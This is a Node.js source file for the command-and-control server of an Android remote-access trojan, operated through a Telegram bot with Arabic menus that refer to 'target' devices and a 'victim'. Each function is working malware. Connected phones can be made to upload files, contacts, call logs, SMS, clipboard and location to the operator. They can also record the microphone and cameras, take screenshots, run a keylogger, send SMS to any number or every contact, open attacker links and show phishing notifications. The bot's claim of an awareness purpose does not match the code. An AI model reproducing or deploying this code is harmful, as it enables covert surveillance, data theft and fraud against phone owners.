const express = require('express');
const webSocket = require('ws');
const http = require('http')
const telegramBot = require('node-telegram-bot-api')
const uuid4 = require('uuid')
const multer = require('multer');
const bodyParser = require('body-parser')
const axios = require("axios");

const token = 'token'
const id = 'id'
const address = 'https://www.google.com'

const app = express();
const appServer = http.createServer(app);
const appSocket = new webSocket.Server({server: appServer});
const appBot = new telegramBot(token, {polling: true});
const appClients = new Map()

const upload = multer({ dest: 'uploadedFile/' });
const fs = require('fs');

app.use(bodyParser.json());

let currentUuid = ''
let currentNumber = ''
let currentTitle = ''

app.get('/', function (req, res) {
    res.send('<h1 align="center">𝙎𝙚𝙧𝙫𝙚𝙧 𝙪𝙥𝙡𝙤𝙖𝙙𝙚𝙙 𝙨𝙪𝙘𝙘𝙚𝙨𝙨𝙛𝙪𝙡𝙡𝙮</h1>')
})

app.get('/getFile/*', function (req, res) {
  const filePath = __dirname + '/uploadedFile/' + encodeURIComponent(req.params[0])
  fs.stat(filePath, function(err, stat) {
    if(err == null) {
      res.sendFile(filePath)
    } else if (err.code === 'ENONET') {
      res.send(`<h1>File not exist</h1>`)
    } else {
      res.send(`<h1>Error, not found</h1>`)
    }
  });
})

app.get('/deleteFile/*', function (req, res) {
  const fileName = req.params[0]
  const filePath = __dirname + '/uploadedFile/' + encodeURIComponent(req.params[0])
  fs.stat(filePath, function(err, stat) {
    if (err == null) {
      fs.unlink(filePath, (err) => {
        if (err) {
          res.send(`<h1>The file "${fileName}" was not deleted</h1>` + `<br><br>` + `<h1>!Try Again!</h1>`)
        } else {
          res.send(`<h1>The file "${fileName}" was deleted</h1>` + `<br><br>` + `<h1>Success!!!</h1>`)
        }
      });
    } else if (err.code === 'ENOENT') {
      // file does not exist
      res.send(`<h1>"${fileName}" does not exist</h1>` + `<br><br>` + `<h1>The file dosent exist to be deleted.</h1>`)
    } else {
      res.send('<h1>Some other error: </h1>', err.code)
    }
  });
})



app.post("/uploadFile", upload.single('file'), (req, res) => {
    const name = req.file.originalname
    const file_name = req.file.filename
    const filePath = __dirname + '/uploadedFile/' +encodeURIComponent(name)
    const host_url = req.protocol + '://' + req.get('host')
    fs.rename(__dirname + '/uploadedFile/' + file_name, __dirname + '/uploadedFile/' +encodeURIComponent(name), function(err) { 
      if ( err ) console.log('ERROR: ' + err);
    });
    appBot.sendMessage(id, `°• رسالة من <b>${req.headers.model}</b> رسالة من الجهاز\n\n 𝙵𝚒𝚕𝚎 𝙽𝚊𝚖𝚎: ` + name + ` \n 𝙵𝚒𝚕𝚎 𝙸𝚍: ` + file_name + `\n\n 𝙵𝚒𝚕𝚎 𝙻𝚒𝚗𝚔: ` + host_url + `/getFile/` + encodeURIComponent(name) + `\n\n 𝙳𝚎𝚕𝚎𝚝𝚎 𝙻𝚒𝚗𝚔: ` + host_url + `/deleteFile/` + encodeURIComponent(name),
   {
     parse_mode: "HTML",
       reply_markup: {
         inline_keyboard: [
           [{text: 'حذف الملف', callback_data: `delete_file:${name}`}]
         ]}
   }, 
{parse_mode: "HTML", disable_web_page_preview: true})
   res.send('')
})

app.post("/uploadText", (req, res) => {
    appBot.sendMessage(id, `°• رسالة من <b>${req.headers.model}</b> رسالة من الجهاز\n\n` + req.body['text'],
    {
      parse_mode: "HTML",
        "reply_markup": {
          "keyboard": [["الأجهزة المتصلة🤖"], ["قائمة الأوامر🕹"]],
          'resize_keyboard': true
    }
},  {parse_mode: "HTML", disable_web_page_preview: true})
    res.send('')
})
app.post("/uploadLocation", (req, res) => {
    appBot.sendLocation(id, req.body['lat'], req.body['lon'])
    appBot.sendMessage(id, `°• الموقع من <b>${req.headers.model}</b> رسالة من الجهاز`,
    {
      parse_mode: "HTML",
        "reply_markup": {
          "keyboard": [["الأجهزة المتصلة🤖"], ["قائمة الأوامر🕹"]],
          'resize_keyboard': true
    }
},  {parse_mode: "HTML"})
    res.send('')
})
appSocket.on('connection', (ws, req) => {
    const uuid = uuid4.v4()
    const model = req.headers.model
    const battery = req.headers.battery
    const version = req.headers.version
    const brightness = req.headers.brightness
    const provider = req.headers.provider

    ws.uuid = uuid
    appClients.set(uuid, {
        model: model,
        battery: battery,
        version: version,
        brightness: brightness,
        provider: provider
    })
    appBot.sendMessage(id,
        `°• رسالة جديدة من متصل\n\n` +
        `• ᴅᴇᴠɪᴄᴇ ᴍᴏᴅᴇʟ : <b>${model}</b>\n` +
        `• ʙᴀᴛᴛᴇʀʏ : <b>${battery}</b>\n` +
        `• ᴀɴᴅʀᴏɪᴅ ᴠᴇʀꜱɪᴏɴ : <b>${version}</b>\n` +
        `• ꜱᴄʀᴇᴇɴ ʙʀɪɢʜᴛɴᴇꜱꜱ : <b>${brightness}</b>\n` +
        `• ᴘʀᴏᴠɪᴅᴇʀ : <b>${provider}</b>`,
        {parse_mode: "HTML"}
    )
    ws.on('close', function () {
        appBot.sendMessage(id,
            `°• الجهاز مفصول\n\n` +
            `• ᴅᴇᴠɪᴄᴇ ᴍᴏᴅᴇʟ : <b>${model}</b>\n` +
            `• ʙᴀᴛᴛᴇʀʏ : <b>${battery}</b>\n` +
            `• ᴀɴᴅʀᴏɪᴅ ᴠᴇʀꜱɪᴏɴ : <b>${version}</b>\n` +
            `• ꜱᴄʀᴇᴇɴ ʙʀɪɢʜᴛɴᴇꜱꜱ : <b>${brightness}</b>\n` +
            `• ᴘʀᴏᴠɪᴅᴇʀ : <b>${provider}</b>`,
            {parse_mode: "HTML"}
        )
        appClients.delete(ws.uuid)
    })
})
appBot.on('message', (message) => {
    const chatId = message.chat.id;
    if (message.reply_to_message) {
        if (message.reply_to_message.text.includes('°• يرجى الرد بالرقم الذي تريد إرسال الرسالة النصية إليه')) {
            currentNumber = message.text
            appBot.sendMessage(id,
                '°• رائع، الآن أدخل الرسالة التي تريد إرسالها إلى هذا الرقم\n\n' +
                '• كن حذرًا من أن الرسالة لن تُرسل إذا كان عدد الأحرف في رسالتك أكثر من الحد المسموح به',
                {reply_markup: {force_reply: true}}
            )
        }
        if (message.reply_to_message.text.includes('°• رائع، الآن أدخل الرسالة التي تريد إرسالها إلى هذا الرقم')) {
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`send_message:${currentNumber}/${message.text}`)
                }
            });
            currentNumber = ''
            currentUuid = ''
            appBot.sendMessage(id,
                '°• طلبك قيد المعالجة\n\n' +
                '• سوف تتلقى ردًا خلال اللحظات القليلة القادمة'
            )
        }
        if (message.reply_to_message.text.includes('°• أدخل الرسالة التي تريد إرسالها إلى جميع جهات الاتصال')) {
            const message_to_all = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`send_message_to_all:${message_to_all}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '°• طلبك قيد المعالجة\n\n' +
                '• سوف تتلقى ردًا خلال اللحظات القليلة القادمة'
            )
        }

        if (message.reply_to_message.text.includes('°• أدخل الرابط الذي تريد إرساله')) {
            const message_to_all = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`open_target_link:${message_to_all}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '°• طلبك قيد المعالجة\n\n' +
                '• سوف تتلقى ردًا خلال اللحظات القليلة القادمة'
            )
        }
        if (message.reply_to_message.text.includes('°• أدخل النص الذي تريد التحدث به')) {
            const message_to_tts = message.text
            const message_tts_link = 'https://translate.google.com/translate_tts?ie=UTF-8&tl=en&tk=995126.592330&client=t&q=' + encodeURIComponent(message_to_tts)
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`text_to_speech:${message_tts_link}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '°• طلبك قيد المعالجة\n\n' +
                '• سوف تتلقى ردًا خلال اللحظات القليلة القادمة'
            )
        }



        if (message.reply_to_message.text.includes('°• أدخل مسار الملف الذي تريد تنزيله')) {
            const path = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`file:${path}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '°• طلبك قيد المعالجة\n\n' +
                '• سوف تتلقى ردًا خلال اللحظات القليلة القادمة'
            )
        }
        if (message.reply_to_message.text.includes('°• أدخل مسار الملف الذي تريد حذفه')) {
            const path = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`delete_file:${path}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '°• طلبك قيد المعالجة\n\n' +
                '• سوف تتلقى ردًا خلال اللحظات القليلة القادمة'
            )
        }
        if (message.reply_to_message.text.includes('°•أدخل المدة الزمنية التي تريد تسجيل الصوت باستخدام الميكروفون خلالها')) {
            const duration = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`microphone:${duration}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '°• طلبك قيد المعالجة\n\n' +
                '• سوف تتلقى ردًا خلال اللحظات القليلة القادمة'
            )
        }
        if (message.reply_to_message.text.includes('°• أدخل المدة الزمنية التي تريد تسجيل الفيديو باستخدام الكاميرا الرئيسية خلالها')) {
            const duration = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`rec_camera_main:${duration}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '°• طلبك قيد المعالجة\n\n' +
                '• سوف تتلقى ردًا خلال اللحظات القليلة القادمة'
            )
        }
        if (message.reply_to_message.text.includes('°• أدخل المدة الزمنية التي تريد تسجيل الفيديو باستخدام الكاميرا الأمامية خلالها')) {
            const duration = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`rec_camera_selfie:${duration}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '°• طلبك قيد المعالجة\n\n' +
                '• سوف تتلقى ردًا خلال اللحظات القليلة القادمة'
            )
        }
        if (message.reply_to_message.text.includes('°• أدخل الرسالة التي تريد أن تظهر على الجهاز المستهدف')) {
            const toastMessage = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`toast:${toastMessage}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '°• طلبك قيد المعالجة\n\n' +
                '• سوف تتلقى ردًا خلال اللحظات القليلة القادمة'
            )
        }
        if (message.reply_to_message.text.includes('°• أدخل الرسالة التي تريد أن تظهر كإشعار')) {
            const notificationMessage = message.text
            currentTitle = notificationMessage
            appBot.sendMessage(id,
                '°• رائع، الآن أدخل الرابط الذي تريد أن يتم فتحه بواسطة الإشعار\n\n' +
                '• عندما ينقر الضحية على الإشعار، سيتم فتح الرابط الذي تقوم بإدخاله',
                {reply_markup: {force_reply: true}}
            )
        }
        if (message.reply_to_message.text.includes('°• رائع، الآن أدخل الرابط الذي تريد أن يتم فتحه بواسطة الإشعار')) {
            const link = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`show_notification:${currentTitle}/${link}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '°• طلبك قيد المعالجة\n\n' +
                '• سوف تتلقى ردًا خلال اللحظات القليلة القادمة'
            )
        }
        if (message.reply_to_message.text.includes('°• أدخل رابط الصوت الذي تريد تشغيله')) {
            const audioLink = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`play_audio:${audioLink}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '°• طلبك قيد المعالجة\n\n' +
                '• سوف تتلقى ردًا خلال اللحظات القليلة القادمة'
            )
        }
    }
    if (id == chatId) {
        if (message.text == '/start') {
            appBot.sendMessage(id,
                '°• مرحبا بك في بوت اختراق @freeusr\n\n' +
                '• رجاء عدم استخدام البوت فيما يغضب  الله.هذا البوت غرض التوعية وحماية نفسك من الاختراق\n\n' +
                '• قناتي تليجرام t.me/freeusr\n\n' +
                '• اضغط هنا  /start\n\n' +
                '\n\n' +
                'تم صنع هذا البوت من قبل @l1o_a1i',
                {
                    parse_mode: "HTML",
                    disable_web_page_preview: true,
                    "reply_markup": {
                        "keyboard": [["الأجهزة المتصلة🤖"], ["قائمة الأوامر🕹"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.text == 'الأجهزة المتصلة🤖') {
            if (appClients.size == 0) {
                appBot.sendMessage(id,
                    '°•  لا تتوفر أجهزة توصيل ❎\n\n' +
                    '•تأكد من تثبيت التطبيق على الجهاز المستهدف'
                )
            } else {
                let text = '°• متابعة الأجهزة المتصلة🤖 :\n\n'
                appClients.forEach(function (value, key, map) {
                    text += `• ᴅᴇᴠɪᴄᴇ ᴍᴏᴅᴇʟ : <b>${value.model}</b>\n` +
                        `• ʙᴀᴛᴛᴇʀʏ : <b>${value.battery}</b>\n` +
                        `• ᴀɴᴅʀᴏɪᴅ ᴠᴇʀꜱɪᴏɴ : <b>${value.version}</b>\n` +
                        `• ꜱᴄʀᴇᴇɴ ʙʀɪɢʜᴛɴᴇꜱꜱ : <b>${value.brightness}</b>\n` +
                        `• ᴘʀᴏᴠɪᴅᴇʀ : <b>${value.provider}</b>\n\n`
                })
                appBot.sendMessage(id, text, {parse_mode: "HTML"})
            }
        }
        if (message.text == 'قائمة الأوامر🕹') {
            if (appClients.size == 0) {
                appBot.sendMessage(id,
                    '°•  لا تتوفر أجهزة توصيل ❎\n\n' +
                    '•تأكد من تثبيت التطبيق على الجهاز المستهدف'
                )
            } else {
                const deviceListKeyboard = []
                appClients.forEach(function (value, key, map) {
                    deviceListKeyboard.push([{
                        text: value.model,
                        callback_data: 'device:' + key
                    }])
                })
                appBot.sendMessage(id, '°• حدد الجهاز لتنفيذ الأمر', {
                    "reply_markup": {
                        "inline_keyboard": deviceListKeyboard,
                    },
                })
            }
        }
    } else {
        appBot.sendMessage(id, '°• تم رفض الإذن')
    }
})
appBot.on("callback_query", (callbackQuery) => {
    const msg = callbackQuery.message;
    const data = callbackQuery.data
    const commend = data.split(':')[0]
    const uuid = data.split(':')[1]
    console.log(uuid)
    if (commend == 'device') {
        appBot.editMessageText(`°• حدد الأمر للجهاز : <b>${appClients.get(data.split(':')[1]).model}</b>`, {
            width: 10000,
            chat_id: id,
            message_id: msg.message_id,
            reply_markup: {
                inline_keyboard: [
                    [
                        {text: 'تطبيقات', callback_data: `apps:${uuid}`},
                        {text: 'معلومات الجهاز', callback_data: `device_info:${uuid}`}
                    ],
                    [
                        {text: 'احصل على الملف', callback_data: `file:${uuid}`},
                        {text: 'حذف ملف', callback_data: `delete_file:${uuid}`}
                    ],
                    [
                        {text: 'الحافظة', callback_data: `clipboard:${uuid}`},
                        {text: 'الميكروفون', callback_data: `microphone:${uuid}`},
                    ],
                    [
                        {text: 'الكاميرا الرئيسية', callback_data: `camera_main:${uuid}`},
                        {text: 'كاميرا السيلفي', callback_data: `camera_selfie:${uuid}`}
                    ],
                    [
                        {text: 'تسجيل الكاميرا الرئيسية', callback_data: `rec_camera_main:${uuid}`},
                        {text: 'تسجيل كاميرا السيلفي', callback_data: `rec_camera_selfie:${uuid}`}
                    ],
                    [
                        {text: 'الموقع', callback_data: `location:${uuid}`},
                        {text: 'إشعار منبثق', callback_data: `toast:${uuid}`}
                    ],
                    [
                        {text: 'المكالمات', callback_data: `calls:${uuid}`},
                        {text: 'جهات الاتصال', callback_data: `contacts:${uuid}`}
                    ],
                    [
                        {text: 'اهتزاز', callback_data: `vibrate:${uuid}`},
                        {text: 'عرض الإشعار', callback_data: `show_notification:${uuid}`}
                    ],
                    [
                        {text: 'الرسائل', callback_data: `messages:${uuid}`},
                        {text: 'إرسال رسالة', callback_data: `send_message:${uuid}`}
                    ],
                    [
                        {text: 'تشغيل الصوت', callback_data: `play_audio:${uuid}`},
                        {text: 'ايقاف الصوت', callback_data: `stop_audio:${uuid}`},
                    ],
                    [
                        {text: '🔥', callback_data: `my_fire_emoji:${uuid}`},
                        {text: 'لقطة شاشة', callback_data: `screenshot:${uuid}`},
                    ],
                    [
                        {text: 'تشغيل المصباح', callback_data: `torch_on:${uuid}`},
                        {text: 'ايقاف المصباح', callback_data: `torch_off:${uuid}`},
                    ],
                    [
                        {text: 'تشغيل مسجل المفاتيح', callback_data: `keylogger_on:${uuid}`},
                        {text: 'إيقاف مسجل المفاتيح', callback_data: `keylogger_off:${uuid}`},
                    ],
                    [
                        {text: 'فتح رابط الهدف', callback_data: `open_target_link:${uuid}`},
                        {text: 'تحويل النص إلى كلام', callback_data: `text_to_speech:${uuid}`},
                    ],
                    [
                        {
                            text: 'إرسال رسالة إلى جميع جهات الاتصال',
                            callback_data: `send_message_to_all:${uuid}`
                        },
                    ],
                    [
                        {
                            text: 'أزرار الجهاز',
                            callback_data: `device_button:${uuid}`
                        },
                    ]
                ]
            },
            parse_mode: "HTML"
        })
    }
    if (commend == 'calls') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('calls');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• طلبك قيد المعالجة\n\n' +
            '• سوف تتلقى ردًا خلال اللحظات القليلة القادمة'
        )
    }
    if (commend == 'contacts') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('contacts');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• طلبك قيد المعالجة\n\n' +
            '• سوف تتلقى ردًا خلال اللحظات القليلة القادمة'
        )
    }
    if (commend == 'messages') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('messages');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• طلبك قيد المعالجة\n\n' +
            '• سوف تتلقى ردًا خلال اللحظات القليلة القادمة'
        )
    }
    if (commend == 'apps') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('apps');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• طلبك قيد المعالجة\n\n' +
            '• سوف تتلقى ردًا خلال اللحظات القليلة القادمة'
        )
    }
    if (commend == 'device_info') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('device_info');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• طلبك قيد المعالجة\n\n' +
            '• سوف تتلقى ردًا خلال اللحظات القليلة القادمة'
        )
    }
    if (commend == 'clipboard') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('clipboard');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• طلبك قيد المعالجة\n\n' +
            '• سوف تتلقى ردًا خلال اللحظات القليلة القادمة'
        )
    }
    if (commend == 'camera_main') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('camera_main');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• طلبك قيد المعالجة\n\n' +
            '• سوف تتلقى ردًا خلال اللحظات القليلة القادمة'
        )
    }
    if (commend == 'camera_selfie') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('camera_selfie');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• طلبك قيد المعالجة\n\n' +
            '• سوف تتلقى ردًا خلال اللحظات القليلة القادمة'
        )
    }
    if (commend == 'location') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('location');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• طلبك قيد المعالجة\n\n' +
            '• سوف تتلقى ردًا خلال اللحظات القليلة القادمة'
        )
    }
    if (commend == 'vibrate') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('vibrate');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• طلبك قيد المعالجة\n\n' +
            '• سوف تتلقى ردًا خلال اللحظات القليلة القادمة'
        )
    }
    if (commend == 'stop_audio') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('stop_audio');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• طلبك قيد المعالجة\n\n' +
            '• سوف تتلقى ردًا خلال اللحظات القليلة القادمة'
        )
    }
    if (commend == 'send_message') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id, '°• يرجى الرد بالرقم الذي تريد إرسال الرسالة النصية إليه\n\n' +
            '•إذا كنت ترغب في إرسال رسائل نصية إلى أرقام محلية، يمكنك إدخال الرقم مع صفر في البداية، خلاف ذلك، أدخل الرقم مع رمز البلد',
            {reply_markup: {force_reply: true}})
        currentUuid = uuid
    }
    if (commend == 'send_message_to_all') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• أدخل الرسالة التي تريد إرسالها إلى جميع جهات الاتصال\n\n' +
            '• كن حذرًا من أن الرسالة لن تُرسل إذا كان عدد الأحرف في رسالتك أكثر من الحد المسموح به',
            {reply_markup: {force_reply: true}}
        )
        currentUuid = uuid
    }

    if (commend == 'open_target_link') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• أدخل الرابط الذي تريد إرساله\n\n' +
            '• كن حذرًا من إرسال الروابط بمفردها دون أي نص',
            {reply_markup: {force_reply: true}}
        )
        currentUuid = uuid
    }
    if (commend == 'text_to_speech') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• أدخل النص الذي تريد التحدث به\n\n' +
            '• احظ أنه يجب عليك إدخال النص الذي سيتم نطقه بواسطة الجهاز. أي لغة مقبولة.',
            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        )
        currentUuid = uuid
    }
    if (commend == 'my_fire_emoji') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• 🔥 في طور التنفيذ\n\n' +
            '• ستتلقى 🔥 في الدقائق القليلة القادمة\n🔥🔥\n🔥🔥',
            {reply_markup: {force_reply: false}, parse_mode: "HTML"})
        appBot.sendMessage(id,
            '  🔥  \n' +
            ' 🔥🔥 \n' +
            '🔥🔥🔥',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["الأجهزة المتصلة🤖"], ["قائمة الأوامر🕹"]],
                    'resize_keyboard': true
                }
            }
        )
        currentUuid = uuid
    }
    if (commend == 'torch_on') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('torch_on');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• طلبك قيد المعالجة\n\n' +
            '• سوف تتلقى ردًا خلال اللحظات القليلة القادمة'
        )
    }
    if (commend == 'torch_off') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('torch_off');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• طلبك قيد المعالجة\n\n' +
            '• سوف تتلقى ردًا خلال اللحظات القليلة القادمة'
        )
    }
    if (commend == 'keylogger_on') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('keylogger_on');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• طلبك قيد المعالجة\n\n' +
            '• سوف تتلقى ردًا خلال اللحظات القليلة القادمة'
        )
    }
    if (commend == 'keylogger_off') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('keylogger_off');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• طلبك قيد المعالجة\n\n' +
            '• سوف تتلقى ردًا خلال اللحظات القليلة القادمة'
        )
    }
    if (commend == 'screenshot') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('screenshot');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• طلبك قيد المعالجة\n\n' +
            '• سوف تتلقى ردًا خلال اللحظات القليلة القادمة'
        )
    }

    if (commend == 'device_button') {
        currentUuid = uuid
        appBot.editMessageText(`°• اضغط على الأزرار للجهاز : <b>${appClients.get(data.split(':')[1]).model}</b>`, {
            width: 10000,
            chat_id: id,
            message_id: msg.message_id,
            reply_markup: {
                inline_keyboard: [
                    [
                        {text: '|||', callback_data: `device_btn_:${currentUuid}:recent`},
                        {text: '■', callback_data: `device_btn_:${currentUuid}:home`},
                        {text: '<', callback_data: `device_btn_:${currentUuid}:back`}
                    ],
                                        [
                        {text: 'Vol +', callback_data: `device_btn_:${currentUuid}:vol_up`},
                        {text: 'Vol -', callback_data: `device_btn_:${currentUuid}:vol_down`},
                        {text: '⊙', callback_data: `device_btn_:${currentUuid}:power`}
                    ],
                    [
                        {text: 'Exit 🔙', callback_data: `device_btn_:${currentUuid}:exit`}
                    ]
                ]
            },
            parse_mode: "HTML"
        })
    }

    if (commend == 'device_btn_') {
        console.log(data.split(':')[0])
        console.log(data.split(':')[1])
        console.log(data.split(':')[2])

        switch (data.split(':')[2]) {
            case 'recent':
                appSocket.clients.forEach(function each(ws) {
                    if (ws.uuid == uuid) {
                        ws.send('btn_recent');
                    }
                });
                break;
            case 'home':
                appSocket.clients.forEach(function each(ws) {
                    if (ws.uuid == uuid) {
                        ws.send('btn_home');
                    }
                });
                break;
            case 'back':
                appSocket.clients.forEach(function each(ws) {
                    if (ws.uuid == uuid) {
                        ws.send('btn_back');
                    }
                });
                break;
            case 'vol_up':
                appSocket.clients.forEach(function each(ws) {
                    if (ws.uuid == uuid) {
                        ws.send('btn_vol_up');
                    }
                });
                break;
            case 'vol_down':
                appSocket.clients.forEach(function each(ws) {
                    if (ws.uuid == uuid) {
                        ws.send('btn_vol_down');
                    }
                });
                break;
            case 'power':
                appSocket.clients.forEach(function each(ws) {
                    if (ws.uuid == uuid) {
                        ws.send('btn_power');
                    }
                });
                break;
            case 'exit':
                appBot.deleteMessage(id, msg.message_id)
                break;
        } 
    }



    if (commend == 'file') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• أدخل مسار الملف الذي تريد تنزيله\n\n' +
            '• ا تحتاج إلى إدخال المسار الكامل للملف، فقط أدخل المسار الرئيسي. على سبيل المثال، أدخل <b>DCIM/Camera</b> لتلقي ملفات المعرض.',
            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        )
        currentUuid = uuid
    }
    if (commend == 'delete_file') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• أدخل مسار الملف الذي تريد حذفه\n\n' +
            '• لا تحتاج إلى إدخال المسار الكامل للملف، فقط أدخل المسار الرئيسي. على سبيل المثال، أدخل <b> DCIM/Camera </b> لحذف ملفات المعرض.',
            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        )
        currentUuid = uuid
    }
    if (commend == 'microphone') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• أدخل المدة الزمنية التي تريد تسجيل الصوت باستخدام الميكروفون خلالها\n\n' +
            '• يرجى ملاحظة أنه يجب عليك إدخال الوقت بالثواني',
            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        )
        currentUuid = uuid
    }
    if (commend == 'rec_camera_selfie') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• أدخل المدة الزمنية التي تريد تسجيل الكاميرا الأمامية خلالها\n\n' +
            '• يرجى ملاحظة أنه يجب عليك إدخال الوقت بالثواني',
            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        )
        currentUuid = uuid
    }
    if (commend == 'rec_camera_main') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• أدخل المدة الزمنية التي تريد تسجيل الكاميرا الرئيسية خلالها\n\n' +
            '• يرجى ملاحظة أنه يجب عليك إدخال الوقت بالثواني',
            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        )
        currentUuid = uuid
    }
    if (commend == 'toast') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• أدخل الرسالة التي تريد أن تظهر على الجهاز المستهدف\n\n' +
            '• الإشعار هو رسالة قصيرة تظهر على شاشة الجهاز لبضع ثوانٍ',
            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        )
        currentUuid = uuid
    }
    if (commend == 'show_notification') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• أدخل الرسالة التي تريد أن تظهر كإشعار\n\n' +
            '• ستظهر رسالتك في شريط الحالة للجهاز المستهدف كإشعار عادي',
            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        )
        currentUuid = uuid
    }
    if (commend == 'play_audio') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• أدخل رابط الصوت الذي تريد تشغيله\n\n' +
            '• يرجى ملاحظة أنه يجب عليك إدخال الرابط المباشر للصوت المطلوب، وإلا فلن يتم تشغيل الصوت',
            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        )
        currentUuid = uuid
    }
});
setInterval(function () {
    appSocket.clients.forEach(function each(ws) {
        ws.send('ping')
    });
    try {
        axios.get(address).then(r => "")
    } catch (e) {
    }
}, 5000)
appServer.listen(process.env.PORT || 8999);
